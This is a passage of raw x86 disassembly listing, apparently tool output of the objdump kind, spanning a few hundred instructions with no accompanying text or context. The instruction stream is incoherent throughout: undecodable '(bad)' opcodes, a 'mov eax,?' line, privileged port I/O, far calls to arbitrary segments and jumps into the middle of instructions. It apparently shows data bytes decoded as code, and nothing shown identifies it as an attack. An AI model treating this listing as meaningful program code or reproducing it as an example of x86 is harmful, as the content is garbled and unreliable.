  4b16db:	pop    es
  4b16dc:	dec    edx
  4b16dd:	add    edx,edx
  4b16df:	pop    es
  4b16e0:	adc    DWORD PTR [edi],esi
  4b16e2:	sub    DWORD PTR [edx+0x27],eax
  4b16e5:	add    BYTE PTR [edi+0x2c],al
  4b16e8:	sbb    BYTE PTR [ebx+eiz*1],dh
  4b16eb:	push   0xb2058831
  4b16f0:	jb     0x4b170f
  4b16f2:	das    
  4b16f3:	into   
  4b16f4:	adc    al,BYTE PTR [ebx+0x4a]
  4b16f7:	adc    BYTE PTR [edx+ebp*8-0x47],dh
  4b16fb:	loope  0x4b171a
  4b16fd:	xchg   ecx,eax
  4b16fe:	lea    ecx,[edx+ecx*2]
  4b1701:	push   es
  4b1702:	dec    edi
  4b1703:	adc    al,0x6f
  4b1705:	lods   eax,DWORD PTR ds:[esi]
  4b1706:	add    dl,BYTE PTR fs:[edi*1+0x3e1adf18]
  4b170e:	and    esp,0x2c08d153
  4b1714:	ret    
  4b1715:	fild   DWORD PTR [eax]
  4b1717:	leave  
  4b1718:	iret   
  4b1719:	push   ss
  4b171a:	and    BYTE PTR [edx],dl
  4b171c:	mov    edi,0x2b1f8293
  4b1721:	jne    0x4b1704
  4b1723:	gs mov ch,0x74
  4b1726:	fs push esi
  4b1728:	call   0x4713:0x708db742
  4b172f:	loopne 0x4b1735
  4b1731:	push   ds
  4b1732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b1733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1734:	(bad)  
  4b1735:	ret    
  4b1736:	push   0x75c603a9
  4b173b:	push   edx
  4b173c:	lea    esp,[ecx-0x56]
  4b173f:	inc    ebp
  4b1740:	mov    ecx,0x6adf0211
  4b1745:	inc    edx
  4b1746:	stc    
  4b1747:	push   esi
  4b1748:	mov    ch,0x3
  4b174a:	add    eax,0xb00feb68
  4b174f:	pop    edx
  4b1750:	ja     0x4b17bc
  4b1752:	fist   WORD PTR [esi+0x51]
  4b1755:	and    DWORD PTR [esi],eax
  4b1757:	sbb    al,0xf3
  4b1759:	outs   dx,DWORD PTR ds:[esi]
  4b175a:	loop   0x4b1703
  4b175c:	cdq    
  4b175d:	mov    ebx,0xc71bdd57
  4b1762:	inc    ebx
  4b1763:	sub    eax,0x8caac64c
  4b1768:	popf   
  4b1769:	std    
  4b176a:	push   edi
  4b176b:	pop    edx
  4b176c:	sub    al,0x4c
  4b176e:	push   ebx
  4b176f:	mov    ds:0x15e43ef,eax
  4b1774:	je     0x4b178b
  4b1776:	sbb    BYTE PTR [ebp-0x77],cl
  4b1779:	pop    ebp
  4b177a:	pusha  
  4b177b:	lods   eax,DWORD PTR ds:[esi]
  4b177c:	dec    esi
  4b177d:	sbb    BYTE PTR [edx+0x2a],cl
  4b1780:	ret    
  4b1781:	ret    0xb4b9
  4b1784:	repz sbb al,0xb0
  4b1787:	or     bl,BYTE PTR [esp+eiz*4+0x19858eb0]
  4b178e:	popf   
  4b178f:	mov    ebp,0x12285756
  4b1794:	dec    edi
  4b1795:	add    dl,BYTE PTR [ecx+0x19]
  4b1798:	jne    0x4b17c6
  4b179a:	xor    dl,al
  4b179c:	lods   al,BYTE PTR ds:[esi]
  4b179d:	cmp    BYTE PTR [edi],al
  4b179f:	add    edx,DWORD PTR [ebp+0x36b13ebd]
  4b17a5:	pop    esi
  4b17a6:	xchg   edi,eax
  4b17a7:	push   edi
  4b17a8:	pop    esp
  4b17a9:	mov    cl,0x21
  4b17ab:	and    ah,dl
  4b17ad:	test   edi,eax
  4b17af:	add    al,0x85
  4b17b1:	inc    esp
  4b17b2:	test   al,0xc
  4b17b4:	dec    esp
  4b17b5:	push   ebx
  4b17b6:	or     DWORD PTR [ebx],eax
  4b17b8:	ror    ebp,0xf8
  4b17bb:	shl    BYTE PTR [edx],cl
  4b17bd:	mov    bh,0x51
  4b17bf:	xchg   ebp,eax
  4b17c0:	push   esi
  4b17c1:	mov    ch,0x2a
  4b17c3:	dec    ebp
  4b17c4:	(bad)  
  4b17c5:	push   0xd
  4b17c7:	les    esp,FWORD PTR [esi]
  4b17c9:	and    eax,0x20b6a45f
  4b17ce:	add    cl,bh
  4b17d0:	fnstsw WORD PTR [edx+0x4f]
  4b17d3:	dec    ebx
  4b17d4:	and    ebx,esi
  4b17d6:	mov    bl,0x68
  4b17d8:	cwde   
  4b17d9:	cmp    al,BYTE PTR [eax]
  4b17db:	outs   dx,DWORD PTR ds:[esi]
  4b17dc:	fst    QWORD PTR [edx]
  4b17de:	inc    edi
  4b17df:	fmul   QWORD PTR [edi+eiz*4+0x73681a6a]
  4b17e6:	add    al,0xb7
  4b17e8:	inc    esi
  4b17e9:	pop    edx
  4b17ea:	stc    
  4b17eb:	into   
  4b17ec:	cmp    al,0x27
  4b17ee:	xor    DWORD PTR [ecx-0x26],ecx
  4b17f1:	push   ss
  4b17f2:	bnd jnp 0x9ba3cb3a
  4b17f9:	push   es
  4b17fa:	aaa    
  4b17fb:	fld    QWORD PTR [edx]
  4b17fd:	out    0x10,al
  4b17ff:	jb     0x4b1810
  4b1801:	dec    esi
  4b1802:	and    esp,ecx
  4b1804:	aad    0x15
  4b1806:	push   ecx
  4b1807:	sub    eax,0xc4cc2e56
  4b180c:	add    eax,0x2221351c
  4b1811:	and    eax,0x22663004
  4b1816:	push   ecx
  4b1817:	add    ah,BYTE PTR [esi+edx*1-0x29fdd474]
  4b181e:	add    al,0x90
  4b1820:	leave  
  4b1821:	cmp    dl,BYTE PTR es:[edx]
  4b1824:	ror    cl,0x7a
  4b1827:	aas    
  4b1828:	push   eax
  4b1829:	sub    al,ah
  4b182b:	pop    ecx
  4b182c:	fcom   st(1)
  4b182e:	dec    ecx
  4b182f:	add    al,dh
  4b1831:	adc    ch,BYTE PTR [eax+0x45]
  4b1834:	clc    
  4b1835:	jns    0x4b181b
  4b1837:	add    eax,0x73458028
  4b183c:	and    al,0xde
  4b183e:	sub    al,0xc1
  4b1840:	lds    esi,FWORD PTR [ebp+0x9]
  4b1843:	dec    esi
  4b1844:	adc    eax,0xb255003
  4b1849:	push   ss
  4b184a:	mov    ah,0x40
  4b184c:	xor    dh,BYTE PTR [esi+eiz*1+0x5c012515]
  4b1853:	push   ebx
  4b1854:	arpl   WORD PTR [ebp+0x7f8b8024],bp
  4b185a:	imul   esp,DWORD PTR [eax+0x27],0x2fd529f4
  4b1861:	add    DWORD PTR [edx-0x18],eax
  4b1864:	loopne 0x4b1891
  4b1866:	pop    ss
  4b1867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1868:	push   ds
  4b1869:	sub    eax,0x81e149b7
  4b186e:	mov    gs,eax
  4b1870:	cdq    
  4b1871:	or     BYTE PTR [esi],0x61
  4b1874:	dec    ebp
  4b1875:	or     ecx,DWORD PTR [eax+0x52]
  4b1878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b1879:	lea    eax,[esi+0x40]
  4b187c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4b187e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b187f:	mov    eax,ds:0x56f93e9f
  4b1884:	sbb    eax,0x647ae809
  4b1889:	add    al,BYTE PTR [edi-0x407b64a4]
  4b188f:	add    al,0x96
  4b1891:	or     dh,al
  4b1893:	inc    ecx
  4b1894:	adc    DWORD PTR [ecx],eax
  4b1896:	test   BYTE PTR [ebx+edx*8+0x4c0580ba],dl
  4b189d:	push   esi
  4b189e:	je     0x4b1847
  4b18a0:	es dec esp
  4b18a2:	(bad)  
  4b18a3:	in     al,0xe8
  4b18a5:	repnz adc edi,DWORD PTR [edi+0x8]
  4b18a9:	xchg   edi,eax
  4b18aa:	mov    esp,DWORD PTR [edi]
  4b18ac:	sti    
  4b18ad:	mov    esp,0x4d768893
  4b18b2:	cmp    DWORD PTR [edx-0x2cae48f8],esi
  4b18b8:	test   BYTE PTR [ecx-0x3e],ah
  4b18bb:	and    ebp,DWORD PTR [esi-0x23dfd17b]
  4b18c1:	xor    ebx,edi
  4b18c3:	imul   edx,eax,0x1261a69a
  4b18c9:	out    0xc1,al
  4b18cb:	ficom  WORD PTR [edx+0x28]
  4b18ce:	mov    ecx,0xc6cbeb70
  4b18d3:	inc    esi
  4b18d4:	lock out dx,eax
  4b18d6:	pop    ecx
  4b18d7:	aam    0x6e
  4b18d9:	fadd   QWORD PTR [bx-0x7d5b]
  4b18de:	or     al,0xf2
  4b18e0:	call   0x9951:0x4d9e4945
  4b18e7:	es into 
  4b18e9:	mov    ah,0x50
  4b18eb:	add    eax,0x2dea0038
  4b18f0:	es or  al,0xc0
  4b18f3:	in     al,0xa3
  4b18f5:	sub    eax,0xa143a308
  4b18fa:	sar    DWORD PTR [eax],cl
  4b18fc:	mov    DWORD PTR [esi],ebx
  4b18fe:	cmp    eax,0x11e643d1
  4b1903:	test   eax,0xe6c76cc3
  4b1908:	lds    ebp,FWORD PTR [edx]
  4b190a:	mov    WORD PTR [esi-0x3b42c08c],fs
  4b1910:	xchg   esi,eax
  4b1911:	jno    0x4b191b
  4b1913:	pusha  
  4b1914:	mov    bl,0x83
  4b1916:	inc    ebx
  4b1917:	mov    al,0x1e
  4b1919:	dec    edx
  4b191a:	xor    bh,BYTE PTR [ebx-0x40]
  4b191d:	inc    esi
  4b191e:	or     cl,BYTE PTR [ebp-0x7bcac0aa]
  4b1924:	mov    eax,ds:0x421d575
  4b1929:	nop
  4b192a:	test   eax,0x2f4e4b6
  4b192f:	mov    ebx,0xec4eb00a
  4b1934:	or     dl,BYTE PTR [esi-0x49]
  4b1937:	dec    ecx
  4b1938:	ficomp WORD PTR [eax+eax*2-0x410b77e]
  4b193f:	dec    edx
  4b1940:	sbb    eax,DWORD PTR [ebx*1+0x247f908]
  4b1947:	inc    ebx
  4b1948:	add    dh,BYTE PTR [edx]
  4b194a:	fisttp WORD PTR [edx-0x58]
  4b194d:	jb     0x4b193b
  4b194f:	dec    edx
  4b1950:	cwde   
  4b1951:	jg     0x4b1957
  4b1953:	push   edi
  4b1954:	and    DWORD PTR [edi+0x4c382bcf],eax
  4b195a:	mov    ebp,0x687c74f5
  4b195f:	mov    eax,?
  4b1961:	pusha  
  4b1962:	push   es
  4b1963:	lods   al,BYTE PTR ds:[esi]
  4b1964:	ds stos DWORD PTR es:[edi],eax
  4b1966:	cdq    
  4b1967:	idiv   esi
  4b1969:	outs   dx,BYTE PTR ds:[esi]
  4b196a:	or     esp,esp
  4b196c:	sbb    ch,BYTE PTR [edx-0x6]
  4b196f:	imul   esi,DWORD PTR [esi],0x60
  4b1972:	xchg   bl,bl
  4b1974:	xor    bl,BYTE PTR [edi-0x37b3ea32]
  4b197a:	inc    ebp
  4b197b:	imul   ecx,ebp,0xecf06b5f
  4b1981:	shl    DWORD PTR [eax],1
  4b1983:	push   ebp
  4b1984:	(bad)  
  4b1986:	test   eax,0x471ab5c
  4b198b:	loope  0x4b19e8
  4b198d:	dec    ebp
  4b198e:	sbb    DWORD PTR [esi-0x62ef1d65],ebx
  4b1994:	adc    bl,dl
  4b1996:	xchg   esp,eax
  4b1997:	into   
  4b1998:	xor    BYTE PTR [ecx],bl
  4b199a:	sbb    BYTE PTR ds:[edi],cl
  4b199d:	sub    bl,BYTE PTR [edi-0x5fe06aaa]
  4b19a3:	add    al,0x71
  4b19a5:	adc    al,BYTE PTR [eax+eax*4]
  4b19a8:	ficomp WORD PTR [esp+edx*2+0x6]
  4b19ac:	shl    BYTE PTR [eax-0x30],cl
  4b19af:	mov    edi,0x930d57b6
  4b19b4:	or     DWORD PTR [ecx+0x2],esp
  4b19b7:	mov    edi,0x5b15c9c4
  4b19bc:	and    eax,0x44c9bb7d
  4b19c1:	leave  
  4b19c2:	inc    esp
  4b19c3:	mov    dl,0xa7
  4b19c5:	leave  
  4b19c6:	inc    esp
  4b19c7:	leave  
  4b19c8:	inc    esp
  4b19c9:	jb     0x4b1a0e
  4b19cb:	leave  
  4b19cc:	inc    esp
  4b19cd:	leave  
  4b19ce:	inc    esp
  4b19cf:	cmp    BYTE PTR [ebx],ch
  4b19d1:	mov    BYTE PTR [ecx],0xc8
  4b19d4:	inc    esp
  4b19d5:	adc    BYTE PTR [eax+ecx*4],dl
  4b19d8:	iret   
  4b19d9:	les    esp,FWORD PTR [ebx]
  4b19db:	pop    ebx
  4b19dc:	mov    ebx,ecx
  4b19de:	mov    al,0x75
  4b19e0:	adc    eax,DWORD PTR [ecx-0x641a447f]
  4b19e6:	aas    
  4b19e7:	add    DWORD PTR [esi-0x3d9fc3dc],ecx
  4b19ed:	jmp    DWORD PTR [ebp+0x47]
  4b19f0:	or     dh,bh
  4b19f2:	add    eax,0x637f21a1
  4b19f7:	sub    DWORD PTR [ebx-0x55],ebx
  4b19fa:	inc    ebp
  4b19fb:	dec    edx
  4b19fc:	add    DWORD PTR [ecx+0xa31dbd],eax
  4b1a02:	adc    DWORD PTR [edi],ecx
  4b1a04:	and    ebx,DWORD PTR [ebp+0x69]
  4b1a07:	das    
  4b1a08:	sbb    edx,DWORD PTR [edi]
  4b1a0a:	inc    ecx
  4b1a0b:	jecxz  0x4b1a2c
  4b1a0d:	add    al,0xa1
  4b1a0f:	push   ebp
  4b1a10:	hlt    
  4b1a11:	fldz   
  4b1a13:	xor    ecx,DWORD PTR [esp+edx*1]
  4b1a16:	push   cs
  4b1a17:	outs   dx,DWORD PTR ds:[esi]
  4b1a18:	pop    edx
  4b1a19:	mov    ah,0xb4
  4b1a1b:	adc    eax,0xaa7fbc68
  4b1a20:	test   DWORD PTR [edi-0x20],ecx
  4b1a23:	adc    bl,BYTE PTR [edx+0x73]
  4b1a26:	cdq    
  4b1a27:	xchg   edx,eax
  4b1a28:	sti    
  4b1a29:	xchg   edx,eax
  4b1a2a:	mov    DWORD PTR [ebp-0x48ffdedb],edi
  4b1a30:	aad    0x2d
  4b1a32:	sub    eax,0x301f07bb
  4b1a37:	jne    0x4b1a5c
  4b1a39:	ds pop ebx
  4b1a3b:	fwait
  4b1a3c:	inc    ebx
  4b1a3d:	mov    eax,0x6df3789d
  4b1a42:	xor    al,BYTE PTR [eax+0x68389c12]
  4b1a48:	cld    
  4b1a49:	test   al,0xd7
  4b1a4b:	das    
  4b1a4c:	jmp    0x8181:0x8ee98f30
  4b1a53:	retf   
  4b1a54:	push   eax
  4b1a55:	cmp    DWORD PTR [edi],0xffffffbe
  4b1a58:	pop    es
  4b1a59:	jge    0x4b1a5c
  4b1a5b:	inc    edi
  4b1a5c:	sbb    esp,DWORD PTR [edx-0x60]
  4b1a5f:	xchg   esp,eax
  4b1a60:	adc    BYTE PTR [esi-0x72],bl
  4b1a63:	cli    
  4b1a64:	add    ebx,DWORD PTR [edi]
  4b1a66:	pusha  
  4b1a67:	jo     0x4b1a19
  4b1a69:	stos   BYTE PTR es:[edi],al
  4b1a6a:	stos   DWORD PTR es:[edi],eax
  4b1a6b:	xchg   ebp,eax
  4b1a6c:	pusha  
  4b1a6d:	inc    ecx
  4b1a6e:	nop
  4b1a6f:	inc    edx
  4b1a70:	rol    BYTE PTR [ebx],1
  4b1a72:	or     BYTE PTR [edi-0x6e6b9fcf],ch
  4b1a78:	aas    
  4b1a79:	jbe    0x4b1a24
  4b1a7b:	fild   QWORD PTR [eax+esi*2-0x50]
  4b1a7f:	jmp    0x4b1ab8
  4b1a81:	mov    bl,0x9c
  4b1a83:	add    al,0x36
  4b1a85:	jmp    0xca29e563
  4b1a8a:	les    edx,FWORD PTR cs:[eax-0x3f]
  4b1a8e:	faddp  st(1),st
  4b1a90:	leave  
  4b1a91:	adc    esi,ebp
  4b1a93:	ret    
  4b1a94:	mov    ch,0xf5
  4b1a96:	call   0xaa3d281d
  4b1a9b:	push   esp
  4b1a9c:	test   al,0x28
  4b1a9e:	dec    esp
  4b1a9f:	pop    edx
  4b1aa0:	stos   BYTE PTR es:[edi],al
  4b1aa1:	push   es
  4b1aa2:	pop    ecx
  4b1aa3:	fwait
  4b1aa4:	cmp    bl,BYTE PTR [ebx-0x7b]
  4b1aa7:	(bad)  
  4b1aa8:	push   ss
  4b1aa9:	neg    DWORD PTR [ebx]
  4b1aab:	js     0x4b1ac3
  4b1aad:	push   edi
  4b1aae:	mov    al,ds:0x49c2e496
  4b1ab3:	pushf  
  4b1ab4:	sbb    ecx,DWORD PTR [ebx-0x2ca69f9b]
  4b1aba:	out    dx,al
  4b1abb:	mov    edi,DWORD PTR [eax]
  4b1abd:	push   esi
  4b1abe:	push   eax
  4b1abf:	fstp   TBYTE PTR [esi-0x21083031]
  4b1ac5:	xor    DWORD PTR [edx-0x2d],eax
  4b1ac8:	mov    bh,bl
  4b1aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b1acb:	adc    BYTE PTR [edi],dl
  4b1acd:	inc    ebp
  4b1ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b1acf:	add    edx,DWORD PTR [esi-0x42]
  4b1ad2:	es loopne 0x4b1b21
  4b1ad5:	push   edx
  4b1ad6:	das    
  4b1ad7:	test   eax,0x60fe00f
  4b1adc:	jle    0x4b1acf
  4b1ade:	jb     0x4b1b36
  4b1ae0:	test   DWORD PTR [eax-0x4e],esp
  4b1ae3:	and    DWORD PTR [ebx],esi
  4b1ae5:	pop    eax
  4b1ae6:	mov    ah,0x1c
  4b1ae8:	loop   0x4b1a78
  4b1aea:	or     eax,0x32e81fe7
  4b1aef:	sub    DWORD PTR [edi+edi*1+0x77],esi
  4b1af3:	loopne 0x4b1a9a
  4b1af5:	mov    bl,0x4
  4b1af7:	js     0x4b1ab5
  4b1af9:	push   ds
  4b1afa:	adc    al,al
  4b1afc:	es icebp 
  4b1afe:	or     al,al
  4b1b00:	mov    esi,0x3a6a835f
  4b1b05:	je     0x4b1b3c
  4b1b07:	lds    ebp,FWORD PTR [ecx+0x6b]
  4b1b0a:	lods   eax,DWORD PTR ds:[esi]
  4b1b0b:	jle    0x4b1b5d
  4b1b0d:	cli    
  4b1b0e:	sahf   
  4b1b0f:	inc    ebp
  4b1b10:	pop    ebx
  4b1b11:	or     al,0xbe
  4b1b13:	or     cl,ah
  4b1b15:	and    BYTE PTR [eax+0xa],dl
  4b1b18:	or     eax,0xa4ae7665
  4b1b1d:	adc    al,0xea
  4b1b1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b1b20:	gs clc 
  4b1b22:	(bad)
  4b1b26:	push   esp
  4b1b27:	cmp    al,0x90
  4b1b29:	mov    bh,dh
  4b1b2b:	and    BYTE PTR [esi-0x51],dh
  4b1b2e:	inc    ecx
  4b1b2f:	pop    ss
  4b1b30:	push   cs
  4b1b31:	adc    esi,DWORD PTR ds:[esi-0x20]
  4b1b35:	cmp    al,0x9d
  4b1b37:	mov    al,0x4d
  4b1b39:	push   esp
  4b1b3a:	add    BYTE PTR [esi+ebx*8-0x70],0xcb
  4b1b3f:	add    al,BYTE PTR [ecx]
  4b1b41:	jp     0x4b1b66
  4b1b43:	mov    bl,0xcf
  4b1b45:	dec    eax
  4b1b46:	mov    ds:0xf7149070,al
  4b1b4b:	push   ebp
  4b1b4c:	cld    
  4b1b4d:	shl    edx,cl
  4b1b4f:	push   esi
  4b1b50:	mov    dl,BYTE PTR [ebp+0x378dcf21]
  4b1b56:	retf   
  4b1b57:	dec    edi
  4b1b58:	and    edx,edi
  4b1b5a:	or     DWORD PTR [eax],eax
  4b1b5c:	es push cs
  4b1b5e:	lock xchg bl,bh
  4b1b61:	mov    ds,WORD PTR [edx]
  4b1b63:	dec    edi
  4b1b64:	jmp    0x4b1b6a
  4b1b66:	not    eax
  4b1b68:	retf   0x2305
  4b1b6b:	jge    0x4b1bc7
  4b1b6d:	arpl   WORD PTR [ebx+0x58],cx
  4b1b70:	mov    esp,0xd345ff4b
  4b1b75:	sub    bl,cl
  4b1b77:	dec    eax
  4b1b78:	loope  0x4b1bb1
  4b1b7a:	sbb    BYTE PTR [edx+0x21],ch
  4b1b7d:	and    eax,edi
  4b1b7f:	or     eax,DWORD PTR [ebp+0x2f]
  4b1b82:	bound  esi,QWORD PTR [edx+ebp*2]
  4b1b85:	or     BYTE PTR [ecx],cl
  4b1b87:	js     0x4b1bbb
  4b1b89:	push   esi
  4b1b8a:	fsub   QWORD PTR [esi+edi*2+0x1b811165]
  4b1b91:	test   DWORD PTR [eax+0x6c],eax
  4b1b94:	fbstp  TBYTE PTR [edi]
  4b1b96:	outs   dx,BYTE PTR ds:[esi]
  4b1b97:	pop    edi
  4b1b98:	push   ebx
  4b1b99:	shr    BYTE PTR [eax+0x23],0xc3
  4b1b9d:	adc    BYTE PTR [eax+0x6c78fe03],dl
  4b1ba3:	mov    ebx,0xa2fca8c2
  4b1ba8:	je     0x4b1ba9
  4b1baa:	sub    edi,esi
  4b1bac:	push   cs
  4b1bad:	jge    0x4b1ba9
  4b1baf:	es jno 0x4b1b93
  4b1bb2:	pop    edx
  4b1bb3:	test   bl,dl
  4b1bb5:	push   ebx
  4b1bb6:	jns    0x4b1c22
  4b1bb8:	push   0x5b
  4b1bba:	push   esi
  4b1bbb:	xor    al,0xac
  4b1bbd:	add    BYTE PTR [esi],0x40
  4b1bc0:	mov    ah,0xa3
  4b1bc2:	(bad)  
  4b1bc4:	jmp    0x4b1bc6
  4b1bc6:	add    ecx,edx
  4b1bc8:	add    DWORD PTR [edx],eax
  4b1bca:	adc    eax,0xb04a4181
  4b1bcf:	aas    
  4b1bd0:	adc    eax,0x6a650bad
  4b1bd5:	or     BYTE PTR [edi+0x33],bl
  4b1bd8:	mov    ebx,0x9774edf6
  4b1bdd:	jp     0x4b1bbd
  4b1bdf:	jbe    0x4b1bf4
  4b1be1:	gs or  al,0xb1
  4b1be4:	sub    eax,0xd2d42231
  4b1be9:	sub    bl,BYTE PTR [ebx-0x40]
  4b1bec:	jb     0x4b1bdb
  4b1bee:	dec    ecx
  4b1bef:	rcl    DWORD PTR [esi],1
  4b1bf1:	ret    0x871
  4b1bf4:	inc    ecx
  4b1bf5:	lea    esi,[eax+0x5cbb18a]
  4b1bfb:	jg     0x4b1bf4
  4b1bfd:	adc    eax,0xd7a42aa4
  4b1c02:	pop    ss
  4b1c03:	add    DWORD PTR [eax],esp
  4b1c05:	pop    eax
  4b1c06:	or     BYTE PTR [ecx+ecx*1],0xa5
  4b1c0a:	sub    eax,0x21a64224
  4b1c0f:	ror    DWORD PTR [edx],0x6a
  4b1c12:	ins    DWORD PTR es:[edi],dx
  4b1c13:	and    DWORD PTR [esi],edx
  4b1c15:	mov    bh,0x6d
  4b1c17:	adc    al,0xb7
  4b1c19:	sahf   
  4b1c1a:	jno    0x4b1c40
  4b1c1c:	jae    0x4b1c11
  4b1c1e:	xchg   ecx,eax
  4b1c1f:	mov    esi,0x5b05b2dd
  4b1c24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b1c25:	xor    DWORD PTR [edi+0x56],edx
  4b1c28:	ret    
  4b1c29:	je     0x4b1c43
  4b1c2b:	push   esi
  4b1c2c:	push   edx
  4b1c2d:	inc    edi
  4b1c2e:	adc    edx,DWORD PTR [ebx-0x67b2f8ef]
  4b1c34:	adc    eax,0x418e5aa8
  4b1c39:	lds    eax,FWORD PTR [ecx-0x7ce9d15f]
  4b1c3f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4b1c41:	pop    ds
  4b1c42:	cmp    ah,BYTE PTR fs:[ecx-0x55f874af]
  4b1c49:	adc    eax,0xbbcda149
  4b1c4e:	add    eax,DWORD PTR [esi+0x7b8344c5]
  4b1c54:	sub    eax,0x5e4ab00
  4b1c59:	mov    DWORD PTR es:[esp+edi*4-0x3e8c3960],0xc68dc25d
  4b1c65:	scas   eax,DWORD PTR es:[edi]
  4b1c66:	and    BYTE PTR [eax],bh
  4b1c68:	push   edi
  4b1c69:	rol    DWORD PTR [esi-0x76],1
  4b1c6c:	dec    eax
  4b1c6d:	sub    eax,0x4075743c
  4b1c72:	inc    edi
  4b1c73:	mov    dh,BYTE PTR [eax+0x4bed6bc0]
  4b1c79:	iret   
  4b1c7a:	shl    DWORD PTR [eax-0x3e],1
  4b1c7d:	push   0xfffffff3
  4b1c7f:	pop    es
  4b1c80:	aam    0x29
  4b1c82:	mov    ebp,0x127bbb6a
  4b1c87:	shl    DWORD PTR [ecx],cl
  4b1c89:	adc    eax,0x1bba6c1
  4b1c8e:	dec    ebp
  4b1c8f:	add    al,0xcf
  4b1c91:	pop    esp
  4b1c92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b1c93:	mov    bh,0x33
  4b1c95:	cs (bad) 
  4b1c98:	or     ecx,0x40
  4b1c9b:	jp     0x4b1c9e
  4b1c9d:	ret    0x5e40
  4b1ca0:	sbb    eax,0x2df10f2b
  4b1ca5:	pop    ebp
  4b1ca6:	sbb    al,0xa
  4b1ca8:	stc    
  4b1ca9:	lods   eax,DWORD PTR ds:[esi]
  4b1caa:	arpl   WORD PTR [eax],bp
  4b1cac:	das    
  4b1cad:	sbb    ebx,ebp
  4b1caf:	xchg   BYTE PTR [edx+ebx*2+0x57c49080],al
  4b1cb6:	jp     0x4b1c5a
  4b1cb8:	int    0x75
  4b1cba:	xor    BYTE PTR [edi+0x2d],dl
  4b1cbd:	lods   al,BYTE PTR ds:[esi]
  4b1cbe:	ins    BYTE PTR es:[edi],dx
  4b1cbf:	xchg   edi,eax
  4b1cc0:	hlt    
  4b1cc1:	jge    0x4b1d0d
  4b1cc3:	aas    
  4b1cc4:	pushf  
  4b1cc5:	daa    
  4b1cc6:	push   esp
  4b1cc7:	jne    0x4b1c78
  4b1cc9:	hlt    
  4b1cca:	test   eax,0x3a3db015
  4b1ccf:	jle    0x4b1cf5
  4b1cd1:	mov    eax,0x6151718c
  4b1cd6:	loope  0x4b1d2a
  4b1cd8:	adc    ebx,DWORD PTR [edx]
  4b1cda:	mov    ebx,0xf65c5d5b
  4b1cdf:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4b1ce1:	dec    esp
  4b1ce2:	cmp    BYTE PTR [eax+0x10],bl
  4b1ce5:	dec    ebp
  4b1ce6:	or     dl,BYTE PTR [edi+0x37]
  4b1ce9:	xchg   esi,eax
  4b1cea:	or     DWORD PTR [ecx+eax*8],eax
  4b1ced:	sub    DWORD PTR [edx-0x546d0adf],eax
  4b1cf3:	daa    
  4b1cf4:	mov    ch,BYTE PTR [ecx]
  4b1cf6:	sub    BYTE PTR [eax],bh
  4b1cf8:	fild   QWORD PTR [ebx+0x7d5a803d]
  4b1cfe:	pop    ds
  4b1cff:	cmp    eax,0x16030748
  4b1d04:	repnz out 0x23,al
  4b1d07:	cmp    esp,DWORD PTR [ebp+0x45c69a57]
  4b1d0d:	or     DWORD PTR [eax],eax
  4b1d0f:	jp     0x4b1d2a
  4b1d11:	xchg   esi,eax
  4b1d12:	lock jno 0x4b1d66
  4b1d15:	outs   dx,DWORD PTR ds:[esi]
  4b1d16:	and    BYTE PTR [ebx+0x21],ah
  4b1d19:	mov    ds:0x1e481b52,al
  4b1d1e:	repz and al,0x42
  4b1d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1d22:	xor    al,0xdb
  4b1d24:	fmul   DWORD PTR [ebx-0x80]
  4b1d27:	mov    DWORD PTR [ecx+ecx*4],ebp
  4b1d2a:	lea    ebx,[ebp+0x63]
  4b1d2d:	call   0x6f4d72
  4b1d32:	ds or  dh,cl
  4b1d35:	pop    esp
  4b1d36:	shl    BYTE PTR [edi-0x55],cl
  4b1d39:	cmc    
  4b1d3a:	movzx  ebx,BYTE PTR [edi]
  4b1d3d:	xchg   ebx,eax
  4b1d3e:	push   edi
  4b1d3f:	jmp    0x4b1d43
  4b1d41:	sub    BYTE PTR [eax],dl
  4b1d43:	sub    esp,DWORD PTR [ecx-0x49]
  4b1d46:	adc    edx,esp
  4b1d48:	pop    es
  4b1d49:	lods   al,BYTE PTR ds:[esi]
  4b1d4a:	xchg   ebx,eax
  4b1d4b:	dec    eax
  4b1d4c:	addr16 jmp 0x7777a95
  4b1d52:	dec    eax
  4b1d53:	or     ebp,ebx
  4b1d55:	adc    bl,BYTE PTR [ebp+0x53]
  4b1d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b1d59:	retf   
  4b1d5a:	aaa    
  4b1d5b:	adc    dl,BYTE PTR [ebx]
  4b1d5d:	jmp    0x4b1d67
  4b1d5f:	mov    eax,0xe8170301
  4b1d64:	or     al,0x0
  4b1d66:	mov    BYTE PTR [esi],cl
  4b1d68:	push   esp
  4b1d69:	xor    BYTE PTR [ebp+0x58bcb13f],bh
  4b1d6f:	mov    eax,0x1473bbf9
  4b1d74:	sub    al,0xb3
  4b1d76:	or     eax,0x4296186
  4b1d7b:	add    ebx,ecx
  4b1d7d:	mov    cl,0x4b
  4b1d7f:	jge    0x4b1daa
  4b1d81:	and    al,0xb8
  4b1d83:	dec    ecx
  4b1d84:	pop    edx
  4b1d85:	add    al,0xc7
  4b1d87:	popf   
  4b1d88:	mov    ebx,esi
  4b1d8a:	cmp    eax,DWORD PTR [eax-0x6f9655a]
  4b1d90:	daa    
  4b1d91:	sub    DWORD PTR [esi+0x5b],edx
  4b1d94:	and    eax,edx
  4b1d96:	shl    DWORD PTR [esi-0x182e227],cl
  4b1d9c:	or     cl,0x6f
  4b1d9f:	jge    0x4b1e18
  4b1da1:	js     0x4b1d36
  4b1da3:	lea    eax,[edi+0x78]
  4b1da6:	mov    ebx,0xcda49848
  4b1dab:	add    BYTE PTR [edi-0x73],dl
  4b1dae:	xchg   DWORD PTR [eax],ebp
  4b1db0:	add    al,0x91
